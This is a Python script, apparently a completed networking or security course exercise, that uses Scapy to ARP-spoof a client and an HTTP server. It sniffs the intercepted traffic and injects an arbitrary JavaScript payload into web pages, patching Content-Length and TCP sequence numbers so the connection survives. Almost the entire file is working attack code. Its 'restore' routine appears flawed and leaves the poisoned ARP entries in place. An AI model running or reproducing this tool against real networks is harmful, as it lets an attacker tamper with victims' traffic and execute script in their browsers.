#!/usr/bin/env python3
import traceback
import re
from scapy.all import *

import argparse
import sys
import threading
import time

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80


def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface",
                        help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP",
                        help="IP of the client", required=True)
    parser.add_argument("-ip3", "--serverIP",
                        help="IP of the server", required=True)
    parser.add_argument(
        "-s", "--script", help="script to inject", required=True)
    parser.add_argument("-v", "--verbosity",
                        help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arp_request = ARP(op=1, pdst=IP, hwdst='ff:ff:ff:ff:ff:ff')
    resp = sr1(arp_request)
    return resp[ARP].hwsrc


# ARP spoofs client, httpServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC)
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC)
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    gratuitous_arp = ARP(op=2, psrc=srcIP, hwsrc=srcMAC,
                         pdst=dstIP, hwdst=dstMAC)
    send(gratuitous_arp)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    spoof(srcIP, srcMAC, dstIP, dstMAC)


tcpStates = dict()
mtu = 1480
header_length = len(IP(dst='1.1.1.1') / TCP(dport=80))
max_length = mtu - header_length

def faketcp(packet):
    global attackerMAC
    try:
        del packet[IP].len
        del packet[IP].chksum
        del packet[TCP].chksum
        state = (packet[TCP].sport+packet[TCP].dport)
        if state not in tcpStates:
            debug(f'Initialize {packet[TCP].sport}->{packet[TCP].dport}')
            tcpStates[state] = {'nb_more': 0, 'fin': 0, 'split_packet': 0, 'second_load_len': 0}

        print('Seq:', packet.seq, 'Ack:', packet.ack)
        packets = [packet]
        if packet.haslayer(Raw):
            oldlen = len(packet[Raw].load)
            load = packet[Raw].load.decode('utf-8')

            # Recalculate content length
            loads = list(map(lambda x:
                             x.split(':')[0] + ': ' + str(int(x.split(':')[1]) +
                                                          len(args.script) + len('<script></script>'))
                             if x.startswith('Content-Length:') else x,
                             load.split('\r\n')))
            load = '\r\n'.join(loads)

            target = re.compile(re.escape('</body>'), re.IGNORECASE)
            script = f'<script>{args.script}</script></body>'
            load = target.sub(script, load)
            if len(load) <= max_length:
                packet[Raw].load = load.encode('utf-8')
                packets = [packet]
            else:
                first_load = load[:max_length]
                second_load = load[max_length:]
                packet[Raw].load = first_load.encode('utf-8')
                second_packet = Ether(src=attackerMAC) / IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, flags='A', seq=packet[TCP].seq + len(first_load), ack=packet[TCP].ack) / Raw(load=second_load.encode('utf-8'))
                tcpStates[state]['split_packet'] = 1
                tcpStates[state]['second_load_len'] = len(second_load)
                packets = [packet, second_packet]

            len_more = len(load) - oldlen
            debug(f'Len more: {len_more}')

        if packet[TCP].seq!=1 and packet[TCP].sport==80:
            packet.seq += tcpStates[state]['nb_more']
            if len(packets) > 1:
                packets[1].seq += tcpStates[state]['nb_more']
        if packet[TCP].flags.A and packet[TCP].dport==80:
            packet.ack -= tcpStates[state]['nb_more']
            if tcpStates[state]['split_packet'] == 1:
                tcpStates[state]['split_packet'] = 2
                packet.ack += tcpStates[state]['second_load_len']
                tcpStates[state]['second_load_len'] = 0
            elif tcpStates[state]['split_packet'] == 2:
                tcpStates[state]['split_packet'] = 0

        if packet.haslayer(Raw):
            tcpStates[state]['nb_more'] += len_more

        if tcpStates[state]['fin']==2:
            del tcpStates[state]
        else:
            flag = packet[TCP].flags
            if flag.F: tcpStates[state]['fin']+=1

        return packets
    except Exception as e:
        debug(f'Error in faketcp: {e}')
        traceback.print_exc()
        return [packet]


def handle_packet(p):
    global clientMAC, clientIP, httpServerIP, httpServerMAC, attackerIP, attackerMAC
    try:
        # Ignore our own spoofing packets
        if p[Ether].src == attackerMAC:
            return
        if p[Ether].src != attackerMAC and p.haslayer(TCP):
            debug(f'Sniffed: {p.summary()}')
            ps = faketcp(p)

        for p in ps:
            p[Ether].src = attackerMAC
            p[Ether].dst = None
            sendp(p, iface=conf.iface)
    except Exception as e:
        debug(f'Error when sniffing: {e}')
        debug(f'Packet is: {p.summary()}')
    pass

# NOTE: this intercepts all packets that are sent AND received by the attacker, so
# you will want to filter out packets that you do not intend to intercept and forward


def interceptor(packet):
    global clientMAC, clientIP, httpServerIP, httpServerMAC, attackerIP, attackerMAC
    bpf = (
        f"(dst host {clientIP}) or ((src host {clientIP} and ((dst host {httpServerIP}))))")
    debug(f'Sniffer use BPF: {bpf}')
    sniff(store=0, filter=bpf, prn=handle_packet,
          stop_filter=lambda x: False, iface=conf.iface)


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0  # minimize scapy verbosity
    conf.iface = args.interface  # set default interface

    clientIP = args.clientIP
    httpServerIP = args.serverIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(
        clientIP, clientMAC, httpServerIP, httpServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(
        target=sniff, kwargs={'prn': interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
